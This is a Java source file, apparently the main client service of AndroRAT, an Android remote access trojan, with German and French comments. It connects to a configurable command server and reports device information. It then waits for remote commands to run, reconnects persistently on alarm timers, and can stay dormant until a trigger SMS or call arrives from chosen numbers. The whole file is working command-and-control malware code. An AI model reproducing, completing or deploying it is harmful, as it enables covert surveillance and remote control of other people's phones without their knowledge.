package my.app.client;


import inout.Controler;
import inout.Protocol;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.StringTokenizer;
import java.util.prefs.Preferences;

import out.Connection;


import my.app.Library.CallMonitor;
import my.app.Library.SystemInfo;

import Packet.*;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.location.Address;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;

/**
 * Dies ist die eigentliche Hauptklasse. Sie wird direkt von der Start-Activity aufgerufen und ist für den Verbindungsaufbau zuständig.
 */
public class Client extends ClientListener implements Controler {
	/**
	 * TAG	Zur Identifikation der Klasse.
	 */
	public final String TAG = Client.class.getSimpleName();
	/**
	 * conn	Die Verbindung
	 */
	AsyncConnection conn;

	/**
	 * nbAttempts	Wird per default auf 10 gesetzt. Diese Variable wird nach 5 Minuten um 5 verringert und nach 10 Minuten um 3.
	 */
	int nbAttempts = 10; //sera décrementé a 5 pour 5 minute 3 pour  10 minute ..
	/**
	 * elapsedTime	Hierbei handelt es sich um die verstrichene Zeit.
	 */
	int elapsedTime = 1; // 1 minute
	/**
	 * stop	Es ist dafür gedacht den Thread zu beenden wenn die Verbindung abbricht oder beendet wird.
	 */
	boolean stop = false; //Pour que les threads puissent s'arreter en cas de déconnexion
	/**
	 * isRunning	Indikator, ob der Service gestartet ist.
	 */
	boolean isRunning = false; //Le service tourne
	/**
	 * isListening	Hier wird angezeigt ob der Server vebunden ist.
	 */
	boolean isListening = false; //Le service est connecté au serveur
	//final boolean waitTrigger = false; //On attend un évenement pour essayer de se connecter.
	/**
	 * readthread	Der Thread um auf die Nachrichten des Serves zu warten.
	 */
	Thread readthread;
	/**
	 * procCmd	Das Objekt der Klasse um die Nachrichten zu verarbeiten und die entsprechenden Informationen des Geräts zu erhalten.
	 */
	ProcessCommand procCmd ;
	/**
	 * cmd	Dies ist der Befehl um die gewünschten Daten an den Server zu schicken.
	 */
	byte[] cmd ;
	/**
	 * packet Das Paket
	 */
	CommandPacket packet ;
	/**
	 * handler	Ein neuer Handler um die Befehle aus den Nachrichten zu extrahieren.
	 * Diese werden danach der Methode processCommand.
	 */
	private Handler handler = new Handler() {
		
		public void handleMessage(Message msg) {
			Bundle b = msg.getData();
			processCommand(b);
		}
	};


	/**
	 * Diese Methode wird aufgerufen wenn die Klasse das erste Mal erstellt wird.
	 */
	public void onCreate() {
		Log.i(TAG, "In onCreate");
		/**
		 * infos die Klassenvaribale der Klasse ClientListener.
		 */
		infos = new SystemInfo(this);
		/**
		 * procCmd	Ein Objekt der Klasse ProcessCommand wird erstellt und in der Klassenvariablen gespeichert.
		 */
		procCmd = new ProcessCommand(this);
		/**
		 * Hier werden noch die andern Einstellungen geladen.
		 */
		loadPreferences();
	}

	/**
	 * Diese Methode wird aufgerufen sobald ein die Methode startService() aufgerufen wird. Zusätzlich wird dieser Methode der Intent übergeben.
	 * @param intent	Der Intent der den Service gestartet hat
	 * @param flags	Zusätzliche Daten über die Startanfrage
	 * @param startId	Eine einzigartige Nummer die die Startanfrage identifiziert.
	 * @return	START_STICKY
	 */
	public int onStartCommand(Intent intent, int flags, int startId) {
		//toast = Toast.makeText(this	,"Prepare to laod", Toast.LENGTH_LONG);
		//loadPreferences("preferences");
		//Intent i = new Intent(this,Preferences.class);
		//startActivity(i);
		/**
		 * Überprüfen ob ein Intent mit Daten angekommen ist, sollte dies nicht der Fall sein so wird die Methode beendet und START_STICKY zurückgegeben.
		 *
		 */
		if(intent == null)
			return START_STICKY;
		/**
		 * Um zu überprüfen wer den Service gestartet hat.
		 */
		String who = intent.getAction();
		Log.i(TAG, "onStartCommand by: "+ who); //On affiche qui a déclenché l'event

		/**
		 * Sollte der Intent eine IP enthalten so wird dieser aus dem Intent entnommen und in der Klassenvariablen gespeichert.
		 */
		if (intent.hasExtra("IP"))
			this.ip = intent.getExtras().getString("IP");
		/**
		 * Sollte der Intent den Port enthalten so wird dieser entnommen und der Klassenvariablen gespeichert.
		 */
		if (intent.hasExtra("PORT"))
			this.port = intent.getExtras().getInt("PORT");
		/**
		 * Überprüfen ob der Service gestartet wurde oder nicht. Dieser Zweig wird beim ersten Starten durchlaufen.
		 */
		if(!isRunning) {// C'est la première fois qu'on le lance
			
		  	//--- On ne passera qu'une fois ici ---
			/**
			 * Neuer IntentFilter um die Verbindung zu überprüfen.
			 */
		    IntentFilter filterc = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"); //Va monitorer la connexion
			/**
			 * Broadcast um zu überprüfen ob Verbindungen bestehen oder nicht.
			 */
			registerReceiver(ConnectivityCheckReceiver, filterc);
			isRunning = true;
			/**
			 * Neue Verbindung die die Ip und den Port verwendet. Es ist also die Verbindung zum Server.
			 */
			conn = new AsyncConnection(ip,port,this);//On se connecte et on lance les threads
			/**
			 * Hier wird auf das Event gewartet das sich mit dem Server verbunden wird.
			 */
			if(waitTrigger) { //On attends un evenement pour se connecter au serveur
			  	//On ne fait rien
				registerSMSAndCall();
			}
			else {
				Log.i(TAG,"Try to connect to "+ip+":"+port);
				/**
				 * Überprüfen ob eine Verbindung bestehen.
				 */
				conn.execute();
				//if(conn.execute()) {
				if(conn.returnResult()){

					/**
					 * Erstellen eines neuen Paket
					 */
					packet = new CommandPacket();
					/**
					 * Erstellen eines neuen Threads, der auf die Befehle wartet und dieser Thread wird gestartet.
					 */
					readthread = new Thread(new Runnable() { public void run() { waitInstruction(); } });
					readthread.start(); //On commence vraiment a écouter
					/**
					 * Erstellt ein Paket und übergibt diesem die Standardinformationen.
					 */
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0, infos.getBasicInfos());
					/**
					 * Senden des Pakets
					 */
					handleData(0,pack.build());					
					//gps = new GPSListener(this, LocationManager.NETWORK_PROVIDER,(short)4); //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
					isListening = true;

					if(waitTrigger) {
						unregisterReceiver(SMSreceiver); //On désenregistre SMS et Call pour éviter tout appel inutile
						unregisterReceiver(Callreceiver);
						waitTrigger = false;
					}
				}
				else {
					/**
					 * Wenn die Verbindung besteht so können die Variablen für die Verbindung zurückgesetzt werden.
					 */
					if(isConnected) { //On programme le AlarmListener car y a un probleme coté serveur
						resetConnectionAttempts();
						reconnectionAttempts();
					}
					else { //On attend l'update du ConnectivityListener pour se débloquer
						/**
						 * Sollte keine Verbindung bestehen so wird eine Lognachricht geschrieben.
						 */
						Log.w(TAG,"Not Connected wait a Network update");
					}
				}
			}
		}
		/**
		 * Der Service ist schon am laufen.
		 */
		else { //Le service a déjà été lancé
			/**
			 * Besteht schon eine Verbindung.
			 */
			if(isListening) {
				/**
				 * Logeintrag, das schon eine Verbindung besteht.
				 */
				Log.w(TAG,"Called uselessly by: "+ who + " (already listening)");
			}
			else { //Sa veut dire qu'on a reçu un broadcast sms ou call
				//On est ici soit par AlarmListener, ConnectivityManager, SMS/Call ou X
				//Dans tout les cas le but ici est de se connecter
				Log.i(TAG,"Connection by : "+who);
				conn.execute();
				//if(conn.execute()) {
				if (conn.returnResult()){
					/**
					 * Wenn eine Verbindung besteht so wird wieder der Thread zum warten auf Befehle gestartet.
					 */
					readthread = new Thread(new Runnable() { public void run() { waitInstruction(); } });
					readthread.start(); //On commence vraiment a écouter
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0, infos.getBasicInfos());
					handleData(0,pack.build());
					isListening = true;
					if(waitTrigger) {
						unregisterReceiver(SMSreceiver);
						unregisterReceiver(Callreceiver);
						waitTrigger = false; //In case of disconnect does not wait again for a trigger
					}
				}
				else {//On a encore une fois pas réussi a se connecter
					reconnectionAttempts(); // Va relancer l'alarmListener
				}
			}
		}
		 
		return START_STICKY;
	}


	/**
	 * Wartet auf die Befehele in dem die Methode getInstruction der Klasse Connection aufgerufen wird.
	 */
	public void waitInstruction() { //Le thread sera bloqué dedans
		try {
			for(;;) {
				if(stop)
					break;
				/**
				 * Auf Befehle warten.
				 */
				conn.getInstruction() ;
			}
		}
		catch(Exception e) {
			isListening = false;
			resetConnectionAttempts();
			reconnectionAttempts();
			if(waitTrigger) {
				registerSMSAndCall();
			}
		}
	}

	/**
	 * Hier werden die Befehle des Serves extrahiert und der Klasse ProcessCommand zur Verarbeitung übergeben.
	 * @param b Bundel mit den Befehlen der Servers
	 */
	public void processCommand(Bundle b)
    {
		try{
			procCmd.process(b.getShort("command"),b.getByteArray("arguments"),b.getInt("chan"));
		}
		catch(Exception e) {
			sendError("Error on Client:"+e.getMessage());
		}
    }
	
	public void reconnectionAttempts() 
	{
		/*
		 * 10 fois toute les minutes
		 * 5 fois toutes les 5 minutes
		 * 3 fois toute les 10 minutes
		 * 1 fois au bout de 30 minutes
		 */
		/**
		 * Überprüfen ob eine Verbindung besteht
		 */
		if(!isConnected)
			return;
		/**
		 * Sobald die nbAttemps 0 ist wird die elapsedTime erhöht.
		 */
		if(nbAttempts == 0) {
			switch(elapsedTime) {
			case 1:
				elapsedTime = 5;
				break;
			case 5:
				elapsedTime = 10;
				break;
			case 10:
				elapsedTime = 30;
				break;
			case 30:
				return; //Did too much try
			}
		}
		//---- Piece of Code ----
		/**
		 * Dieser Teil setzt einen Kalender auf die Zeit + ElapsedTime.
		 * Zusätzlich wird eine Intent erstellt.
		 * Sobald die neue Zeit erreicht ist wird  mit Hilfe eines AlarmMangers der Intent los geschickt.
		 * Zusätzlich wird nbAttemps um ein verringert.
		 */
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, elapsedTime);
		 
		Intent intent = new Intent(this, AlarmListener.class);
		 
		intent.putExtra("alarm_message", "Wake up Dude !");
		
		PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
		// Get the AlarmManager service
		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);
		
		//-----------------------
		nbAttempts --;
	}

	/**
	 * Laden der Einstellungen, indem das PreferencePacket ausgewertet wird.
	 */
	public void loadPreferences() {
		/**
		 * Erhalten eines Empfangenen PrefernecesPacket
		 */
		PreferencePacket p = procCmd.loadPreferences();
		/**
		 * Die Daten des Pakets extrahieren und in den Klassenvaribalen speichern.
		 */
		waitTrigger = p.isWaitTrigger();
		ip = p.getIp();
		port = p.getPort();
		authorizedNumbersCall = p.getPhoneNumberCall();
		authorizedNumbersSMS = p.getPhoneNumberSMS();
		authorizedNumbersKeywords = p.getKeywordSMS();
	}

	/**
	 * Mit dieser Methode werden verschiedene Informationsdaten an den Server gesendet.
	 * @param infos	Die Informationen die gesendet werden
	 */
	public void sendInformation(String infos) { //Methode que le Client doit implémenter pour envoyer des informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 0, infos).build());
	}

	/**
	 * Mit dieser Methode werden Fehlernachrichten an den Server gesenedt
	 * @param error	Fehlernachricht
	 */
	public void sendError(String error) { //Methode que le Client doit implémenter pour envoyer des informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 1, error).build());
	}

	/**
	 * Methode um die Daten zu senden.
	 * @param channel	Datenkanal
	 * @param data	Die Daten
	 */
	public void handleData(int channel, byte[] data) {
		/**
		 * Aufrufen der sendData-Methode um die Daten an den Server zu schicken-
		 */
		conn.sendData(channel, data);
	}

	/**
	 * Wenn der Service beendet wird so wird diese Funktion aufgerufen
	 */
	public void onDestroy() {
		boolean abc = true;
		//savePreferences("myPref");
		//savePreferences("preferences");
		
		Log.i(TAG, "in onDestroy");
		/**
		 * Den BroadcastReceiver beenden
		 */
		unregisterReceiver(ConnectivityCheckReceiver);
		/**
		 * Die Verbindung beenden
		 */
		conn.stop();
		conn.cancel(abc);
		/**
		 * Die Schleifen beenden
		 */
		stop = true;
		/**
		 * Den Service beenden und zerstören
		 */
		stopSelf();
		super.onDestroy();
	}

	/**
	 * Diese Methode setzt die Verbindungsversuchvariablen auf den default werd zurück
	 */
	public void resetConnectionAttempts() {
		nbAttempts = 10;
		elapsedTime = 1;
	}

	/**
	 * Startet die BroadcastReceiver der Klasse ClientListener.
	 */
	public void registerSMSAndCall() {
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED"); //On enregistre un broadcast receiver sur la reception de SMS
        registerReceiver(SMSreceiver, filter);
        IntentFilter filter2 = new IntentFilter();
        filter2.addAction("android.intent.action.PHONE_STATE");//TelephonyManager.ACTION_PHONE_STATE_CHANGED); //On enregistre un broadcast receiver sur la reception de SMS
        registerReceiver(Callreceiver, filter2);
	}

	/**
	 * Mit dieser Methode wird eine Nachricht erstellt, die von dem oben erstellten Handler ausgelesen werden kann.
	 * @param p	Das Paket
	 * @param i Keine Funktion
	 */
	public void Storage(TransportPacket p, String i) 
	{
		try
		{
			packet = new CommandPacket(); //!!!!!!!!!!!! Sinon on peut surement en valeur les arguments des command précédantes !
			/**
			 * Daten des Pakets auslesen
			 */
			packet.parse(p.getData());
			/**
			 * Neue Message mess und neues Bundle b erstellen
			 */
			Message mess = new Message();
			Bundle b = new Bundle();
			/**
			 * Daten des Pakets in dem Bundle SPeicher
			 */
			b.putShort("command", packet.getCommand());
			b.putByteArray("arguments", packet.getArguments());
			b.putInt("chan", packet.getTargetChannel());
			/**
			 * Das Bundle wird mess hinzugefügt und die Nachricht dann an den Hanlder gesendet.
			 */
			mess.setData(b);
			handler.sendMessage(mess);
		}
		catch(Exception e)
		{
			System.out.println("Androrat.Client.storage : pas une commande");
		}		
	}
}
